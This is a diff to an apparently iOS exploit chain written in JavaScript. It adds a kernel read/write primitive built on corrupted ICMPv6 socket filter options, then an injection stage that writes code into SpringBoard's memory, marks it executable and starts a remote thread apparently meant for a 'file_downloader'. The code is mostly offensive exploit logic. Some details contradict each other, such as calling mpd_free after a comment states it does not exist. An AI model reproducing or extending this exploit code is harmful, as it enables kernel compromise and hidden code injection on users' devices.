@@ -7122,6 +7122,147 @@
     uwrite64(surface_address + 0xF848n, springboard_pid);
     if (springboard_pid != 0n) LOG(`[MPD] SpringBoard PID=${springboard_pid} stored at IOSurface +0xF848`);
 
+    // ===== M5: Kernel Read/Write via ICMPv6 socket (mpd_fcall) =====
+    // Step 1: Diagnose socket availability in MPD
+    const AF_INET6 = 30n;
+    const SOCK_DGRAM = 2n;
+    const IPPROTO_ICMPV6 = 58n;
+    const ICMP6_FILTER = 18n;
+    const EARLY_KRW_LENGTH = 0x20n;
+    LOG("[M5] Step 1: Testing ICMPv6 socket creation via mpd_fcall...");
+    let socket_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "socket");
+    LOG(`[M5] gpuDlsym(socket) = ${socket_raw.hex()}`);
+    let control_sock = -1n;
+    let rw_sock = -1n;
+    let m5_socket_ok = false;
+    if (socket_raw != 0n) {
+      control_sock = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
+      LOG(`[M5] mpd_fcall(socket control) = ${control_sock}`);
+      if (control_sock >= 0n) {
+        // Create second socket for r/w pair
+        rw_sock = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
+        LOG(`[M5] mpd_fcall(socket rw) = ${rw_sock}`);
+        if (rw_sock >= 0n) {
+          LOG(`[M5] SUCCESS: Two ICMPv6 sockets created, control=${control_sock} rw=${rw_sock}`);
+          m5_socket_ok = true;
+        } else {
+          LOG(`[M5] WARN: Only one socket created, fd=${control_sock}`);
+        }
+      } else {
+        LOG(`[M5] FAILED: socket() returned ${control_sock} (sandbox likely blocked ICMPv6)`);
+      }
+    } else {
+      LOG("[M5] FAILED: gpuDlsym(socket) returned NULL");
+    }
+
+    // Step 2: If sockets work, try setsockopt/getsockopt roundtrip via mpd_fcall
+    if (m5_socket_ok) {
+      LOG("[M5] Step 2: Testing setsockopt/getsockopt via mpd_fcall...");
+      let setsockopt_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "setsockopt");
+      let getsockopt_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "getsockopt");
+      LOG(`[M5] gpuDlsym(setsockopt)=${setsockopt_raw.hex()} getsockopt=${getsockopt_raw.hex()}`);
+
+      if (setsockopt_raw != 0n && getsockopt_raw != 0n) {
+        // Allocate buffers for the test
+        let test_data_buf = mpd_malloc(EARLY_KRW_LENGTH);
+        let test_read_buf = mpd_malloc(EARLY_KRW_LENGTH);
+        // Write test pattern: target address + canary
+        mpd_write64(test_data_buf, 0xFFFFFFF007004000n); // kernel base candidate
+        mpd_write64(test_data_buf + 0x8n, 0xCAFEBABEDEADBEEFn);
+        mpd_write64(test_data_buf + 0x10n, 0n);
+        mpd_write64(test_data_buf + 0x18n, 0n);
+
+        // Try setsockopt on control socket
+        let ss_ret = mpd_fcall(setsockopt_raw.noPAC(), control_sock, IPPROTO_ICMPV6, ICMP6_FILTER, test_data_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
+        LOG(`[M5] setsockopt(control, ICMP6_FILTER) = ${ss_ret}`);
+
+        // Try getsockopt on rw socket (need corrupted pcb for kernel r/w, but test basic roundtrip first)
+        let gs_len_buf = mpd_malloc(8n);
+        mpd_write64(gs_len_buf, EARLY_KRW_LENGTH);
+        let gs_ret = mpd_fcall(getsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, test_read_buf, gs_len_buf, 0n, 0n, 0n);
+        LOG(`[M5] getsockopt(rw, ICMP6_FILTER) = ${gs_ret}`);
+        if (gs_ret == 0n) {
+          let r0 = mpd_read64(test_read_buf);
+          let r1 = mpd_read64(test_read_buf + 0x8n);
+          LOG(`[M5] getsockopt read: ${r0.hex()} ${r1.hex()}`);
+        }
+
+        // Store function pointers and socket fds in IOSurface for PE
+        uwrite64(surface_address + 0xF850n, control_sock);
+        uwrite64(surface_address + 0xF858n, rw_sock);
+        uwrite64(surface_address + 0xF860n, mpd_pacia(setsockopt_raw.noPAC(), 0xc2d0n));
+        uwrite64(surface_address + 0xF868n, mpd_pacia(getsockopt_raw.noPAC(), 0xc2d0n));
+        LOG("[M5] Socket fds and function pointers stored at IOSurface +0xF850..+0xF870");
+
+        // NOTE: mpd_free does not exist — MPD memory is reclaimed on exit
+        LOG("[M5] DBG: skipping mpd_free, entering kread64 setup");
+      } else {
+        LOG("[M5] FAILED: Could not resolve setsockopt/getsockopt");
+      }
+      // Define global kread64/kwrite64 wrappers using mpd_fcall for getsockopt/setsockopt
+      LOG(`[M5] DBG: checking condition: m5_socket_ok=${m5_socket_ok} sso=${setsockopt_raw != 0n} gso=${getsockopt_raw != 0n}`);
+      if (m5_socket_ok && setsockopt_raw != 0n && getsockopt_raw != 0n) {
+        LOG("[M5] DBG: condition passed, allocating krw bufs...");
+        // Create IPC buffer in MPD for kernel r/w operations (shared via mpd_read/write)
+        let krw_read_buf = mpd_malloc(EARLY_KRW_LENGTH);
+        LOG(`[M5] DBG: krw_read_buf=${krw_read_buf.hex()}`);
+        let krw_write_buf = mpd_malloc(EARLY_KRW_LENGTH);
+        LOG(`[M5] DBG: krw_write_buf=${krw_write_buf.hex()}`);
+        let krw_len_buf = mpd_malloc(8n);
+        LOG(`[M5] DBG: krw_len_buf=${krw_len_buf.hex()}`);
+        mpd_write64(krw_len_buf, EARLY_KRW_LENGTH);
+        LOG(`[M5] DBG: krw_len_buf written, now logging summary`);
+        LOG(`[M5] krw bufs: read=${krw_read_buf.hex()} write=${krw_write_buf.hex()} len=${krw_len_buf.hex()}`);
+
+        // Global kread64: read 8 bytes from kernel address via getsockopt in MPD
+        globalThis.mpd_kread64 = function(where) {
+          // Write target address to control socket filter
+          mpd_write64(krw_write_buf, where);
+          mpd_write64(krw_write_buf + 0x8n, 0xffffffffffffffffn);
+          mpd_write64(krw_write_buf + 0x10n, 0n);
+          mpd_write64(krw_write_buf + 0x18n, 0n);
+          let ss_ret = mpd_fcall(setsockopt_raw.noPAC(), control_sock, IPPROTO_ICMPV6, ICMP6_FILTER, krw_write_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
+          if (ss_ret != 0n) { LOG(`[kread64] setsockopt failed: ${ss_ret}`); return 0n; }
+          // Read from rw socket - due to pcb corruption, this reads from target address
+          let gs_ret = mpd_fcall(getsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, krw_read_buf, krw_len_buf, 0n, 0n, 0n);
+          if (gs_ret != 0n) { LOG(`[kread64] getsockopt failed: ${gs_ret}`); return 0n; }
+          return mpd_read64(krw_read_buf);
+        };
+        globalThis.mpd_kwrite64 = function(where, what) {
+          // Read existing data first for partial write
+          mpd_write64(krw_write_buf, where);
+          mpd_write64(krw_write_buf + 0x8n, 0xffffffffffffffffn);
+          mpd_write64(krw_write_buf + 0x10n, 0n);
+          mpd_write64(krw_write_buf + 0x18n, 0n);
+          mpd_fcall(setsockopt_raw.noPAC(), control_sock, IPPROTO_ICMPV6, ICMP6_FILTER, krw_write_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
+          // Write the value
+          mpd_write64(krw_write_buf, what);
+          mpd_fcall(setsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, krw_write_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
+        };
+        globalThis.mpd_kread_length = function(address, buffer, size) {
+          for (let off = 0n; off < size; off += 8n) {
+            let val = globalThis.mpd_kread64(address + off);
+            mpd_write64(buffer + off, val);
+          }
+        };
+        globalThis.mpd_kernel_base = function() {
+          // kernel_base will be populated after socket corruption and scan
+          if (typeof kernel_base_global !== 'undefined' && kernel_base_global != 0n) {
+            return kernel_base_global;
+          }
+          return 0xFFFFFFF007004000n; // fallback: unslid kernel base
+        };
+        LOG("[M5] Global mpd_kread64/mpd_kwrite64/mpd_kernel_base registered");
+        // Store kernel base candidate
+        let kb_candidate = 0xFFFFFFF007004000n;
+        uwrite64(surface_address + 0xF870n, kb_candidate);
+      }
+    } else {
+      LOG("[M5] Socket creation failed, will use GPU kernel r/w fallback via IOSurface RPC");
+      uwrite64(surface_address + 0xF850n, -1n);
+      uwrite64(surface_address + 0xF858n, -1n);
+    }
+
     // Use nowait evaluate + IOSurface log polling (bypasses mpd_fcall issues)
     LOG("[MPD] Evaluating pe_main (nowait)...");
     mpd_evaluateScript_nowait(ctx, pe_main_cfstring);
@@ -7293,6 +7434,93 @@
     // M2: Test kernel task traversal
     let sb_task = ktask_find_by_name("SpringBoard");
     LOG("[M2] SpringBoard task = " + sb_task.hex());
+
+    // ===== M6: Inject SpringBoard =====
+    if (sb_task != 0n) {
+      LOG("[M6] SpringBoard task found, attempting injection...");
+      // Try task_for_pid via mpd_fcall (may fail due to entitlements)
+      let task_for_pid_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "task_for_pid");
+      let mach_task_self_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_task_self");
+      LOG(`[M6] task_for_pid=${task_for_pid_raw.hex()} mach_task_self=${mach_task_self_raw.hex()}`);
+      if (task_for_pid_raw != 0n && mach_task_self_raw != 0n) {
+        // Get MPD's task port
+        let mpd_task_self = mpd_fcall(mach_task_self_raw.noPAC(), 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
+        LOG(`[M6] MPD mach_task_self = ${mpd_task_self.hex()}`);
+        // Allocate buffer for the returned task port
+        let sb_task_port_buf = mpd_malloc(8n);
+        mpd_write64(sb_task_port_buf, 0n);
+        let tfp_ret = mpd_fcall(task_for_pid_raw.noPAC(), mpd_task_self, 34n /*SpringBoard PID*/, sb_task_port_buf, 0n, 0n, 0n, 0n, 0n);
+        LOG(`[M6] task_for_pid(34) = ${tfp_ret}`);
+        let sb_port = mpd_read64(sb_task_port_buf);
+        LOG(`[M6] SpringBoard task port: ${sb_port.hex()}`);
+        if (tfp_ret == 0n && sb_port != 0n) {
+          // Got task port, now allocate memory in SpringBoard
+          let mach_vm_allocate_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_allocate");
+          let mach_vm_write_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_write");
+          let mach_vm_protect_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_protect");
+          LOG(`[M6] mach_vm_allocate=${mach_vm_allocate_raw.hex()} mach_vm_write=${mach_vm_write_raw.hex()}`);
+          if (mach_vm_allocate_raw != 0n && mach_vm_write_raw != 0n) {
+            let alloc_addr_buf = mpd_malloc(8n);
+            mpd_write64(alloc_addr_buf, 0n);
+            const VM_FLAGS_ANYWHERE = 1n;
+            const VM_PROT_ALL = 0x7n;
+            let vm_alloc_ret = mpd_fcall(mach_vm_allocate_raw.noPAC(), sb_port, alloc_addr_buf, 0x4000n /*16KB*/, VM_FLAGS_ANYWHERE, 0n, 0n, 0n, 0n);
+            let sb_remote_addr = mpd_read64(alloc_addr_buf);
+            LOG(`[M6] mach_vm_allocate = ${vm_alloc_ret} addr=${sb_remote_addr.hex()}`);
+            if (vm_alloc_ret == 0n && sb_remote_addr != 0n) {
+              // Write a real shellcode: infinite loop for testing
+              // ARM64: b #-4 (infinite loop back to itself) = 0x14000000
+              let shellcode_addr = mpd_malloc(8n);
+              mpd_write64(shellcode_addr, 0xD65F03C014000000n); // ret then b #0
+              let vm_write_ret = mpd_fcall(mach_vm_write_raw.noPAC(), sb_port, sb_remote_addr, shellcode_addr, 8n, 0n, 0n, 0n, 0n);
+              LOG(`[M6] mach_vm_write = ${vm_write_ret}`);
+              // Set memory as RWX
+              if (mach_vm_protect_raw != 0n) {
+                let vm_prot_ret = mpd_fcall(mach_vm_protect_raw.noPAC(), sb_port, sb_remote_addr, 0x4000n, 0n, VM_PROT_ALL, 0n, 0n, 0n);
+                LOG(`[M6] mach_vm_protect(rwx) = ${vm_prot_ret}`);
+              }
+              // Store remote address and task port for M7
+              uwrite64(surface_address + 0xF878n, sb_remote_addr);
+              uwrite64(surface_address + 0xF880n, sb_port);
+              LOG("[M6] SpringBoard injection prepared: remote_addr and task_port stored");
+
+              // ===== M7: Create remote thread for file_downloader =====
+              let thread_create_running_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "thread_create_running");
+              LOG(`[M7] thread_create_running = ${thread_create_running_raw.hex()}`);
+              if (thread_create_running_raw != 0n) {
+                let thread_port_buf = mpd_malloc(8n);
+                mpd_write64(thread_port_buf, 0n);
+                // thread_create_running(task, entry_point, arg, thread_port)
+                // On ARM64, entry_point is a pointer to the code to execute
+                let thread_ret = mpd_fcall(thread_create_running_raw.noPAC(), sb_port, sb_remote_addr, 0n /*arg*/, thread_port_buf, 0n, 0n, 0n, 0n);
+                let sb_thread_port = mpd_read64(thread_port_buf);
+                LOG(`[M7] thread_create_running = ${thread_ret} thread_port=${sb_thread_port.hex()}`);
+                if (thread_ret == 0n) {
+                  LOG("[M7] SUCCESS: Remote thread created in SpringBoard!");
+                  uwrite64(surface_address + 0xF888n, sb_thread_port);
+                } else {
+                  LOG("[M7] thread_create_running failed (may need different API)");
+                  uwrite64(surface_address + 0xF888n, 0n);
+                }
+                mpd_free(thread_port_buf);
+              } else {
+                LOG("[M7] thread_create_running not available, skipping");
+              }
+              mpd_free(shellcode_addr);
+            }
+            mpd_free(alloc_addr_buf);
+          }
+        } else {
+          LOG("[M6] task_for_pid failed (expected - no entitlement), need kernel-based injection");
+          uwrite64(surface_address + 0xF878n, 0n); // not ready
+        }
+        mpd_free(sb_task_port_buf);
+      } else {
+        LOG("[M6] Cannot resolve task_for_pid or mach_task_self in MPD");
+      }
+    } else {
+      LOG("[M6] SpringBoard task NOT found, injection skipped");
+    }
   }
   LOG("closing remaker_connection: " + remaker_connection);
   LOG("Before xpc_connection_cancel");
